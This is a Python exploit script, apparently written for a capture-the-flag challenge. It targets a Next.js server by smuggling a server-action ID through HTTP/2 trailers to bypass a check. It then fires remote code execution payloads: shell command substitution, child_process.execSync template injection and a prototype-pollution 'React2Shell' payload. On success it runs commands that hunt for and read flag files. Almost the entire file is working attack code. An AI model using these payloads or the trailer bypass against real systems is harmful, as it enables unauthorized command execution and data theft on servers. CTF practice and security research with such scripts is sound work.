#!/usr/bin/env python3
"""
Simple RCE test using confirmed H2 trailer bypass
Focus on basic command execution rather than complex payload
"""
import socket
import ssl
import struct
import time
import base64
import re
from urllib.parse import unquote
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# Using action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError(f"ALPN mismatch: {sock.selected_alpn_protocol()}")
    sock.sendall(PREFACE)
    settings_frame = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    sock.sendall(settings_frame)
    return sock

def read_frames(sock, want_stream=1, max_time=15):
    frames = []
    end_time = time.time() + max_time
    while time.time() < end_time:
        try:
            header = sock.recv(9)
            if len(header) < 9:
                break
            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF
            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk
            frames.append((frame_type, flags, stream_id, payload))
            if stream_id == want_stream and (flags & 1):
                break
        except socket.timeout:
            break
        except Exception:
            break
    return frames, True

def parse_response(frames):
    headers = {}
    body = b""
    status = None
    for frame_type, flags, stream_id, payload in frames:
        if frame_type == 1:  # HEADERS
            if b":status" in payload:
                try:
                    status_match = re.search(rb':status\x03(\d{3})', payload)
                    if status_match:
                        status = status_match.group(1).decode()
                except:
                    pass
            if b"location" in payload:
                try:
                    loc_match = re.search(rb'location[^\x00]*\x00([^\x00]+)', payload)
                    if loc_match:
                        headers["location"] = loc_match.group(1).decode()
                except:
                    pass
        elif frame_type == 0:  # DATA
            body += payload
    return status or "200", headers, body

def send_payload(payload_str):
    """Send payload via H2 trailers"""
    sock = open_h2()
    sid = 1

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    body_bytes = payload_str.encode()

    enc = Encoder()
    header_block = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "simple-test"),
    ])

    trailer_block = enc.encode([("next-action", ACTION_ID)])

    # Send frames
    raw = struct.pack(">I", len(header_block))[1:] + b"\x01\x04" + struct.pack(">I", sid) + header_block
    sock.sendall(raw)

    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)

    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    frames, _ = read_frames(sock, want_stream=sid)
    sock.close()
    return parse_response(frames)

def check_result(status, headers, body):
    """Check response for results"""
    if "location" in headers:
        location = headers["location"]
        match = re.search(r'/login\?a=([^;&]+)', location)
        if match:
            try:
                output_b64 = unquote(match.group(1))
                decoded = base64.b64decode(output_b64).decode('utf-8', errors='ignore')
                return f"RCE: {decoded.strip()}"
            except Exception as e:
                return f"Decode error: {e}"

    body_str = body.decode('utf-8', errors='ignore')
    row1_match = re.search(r'^1:(.+?)(?:\n|$)', body_str, re.MULTILINE)
    if row1_match:
        content = row1_match.group(1)
        if "recovery-offline" in content:
            return "recovery-offline (normal)"
        elif "digest" in content:
            return f"error digest in: {content}"
        else:
            return f"action result: {content}"
    return "no clear result"

def main():
    print("=" * 60)
    print("Testing simple command execution approaches")
    print("=" * 60)

    # Maybe the action just needs the right "restore" trigger
    test_cases = [
        # Try to trigger restore directly
        ('restore-trigger', '["$K1", {"restored": true}]'),
        ('restore-confirm', '["$K1", {"confirm": "restore"}]'),

        # Try environment-based RCE
        ('env-injection', '["$K1", {"NODE_ENV": "$(id)"}]'),
        ('path-injection', '["$K1", {"PATH": "$(whoami)"}]'),

        # Try basic template injection
        ('template-basic', '["$K1", "${require(\'child_process\').execSync(\'id\')}"]'),

        # Try the React2Shell approach but simpler
        ('react2shell-minimal', '["$K1", {"__proto__": {"then": "function(){return require(\'child_process\').execSync(\'id\').toString()}"}}]'),
    ]

    for name, payload in test_cases:
        print(f"\n[{name}] Testing...")
        try:
            status, headers, body = send_payload(payload)
            result = check_result(status, headers, body)
            print(f"    {result}")

            if "RCE:" in result and "uid=" in result:
                print(f"\n[!] SUCCESS! {result}")

                # Look for flag immediately
                flag_tests = [
                    '["$K1", {"__proto__": {"then": "function(){return require(\'child_process\').execSync(\'find / -name *flag*\').toString()}"}}]',
                    '["$K1", {"__proto__": {"then": "function(){return require(\'child_process\').execSync(\'cat /flag || cat /flag.txt\').toString()}"}}]'
                ]

                for flag_payload in flag_tests:
                    print(f"\n[+] Searching for flag...")
                    status2, headers2, body2 = send_payload(flag_payload)
                    flag_result = check_result(status2, headers2, body2)
                    if "alfa{" in flag_result:
                        print(f"\n[!] FLAG FOUND: {flag_result}")
                        return
                break

        except Exception as e:
            print(f"    ERROR: {e}")

    print("\n" + "=" * 60)
    print("All simple tests completed. No obvious RCE found.")
    print("The challenge may require:")
    print("1. More complex Next.js RSC exploitation")
    print("2. Finding the legitimate restore script path")
    print("3. Bypassing additional server-side validation")

if __name__ == "__main__":
    main()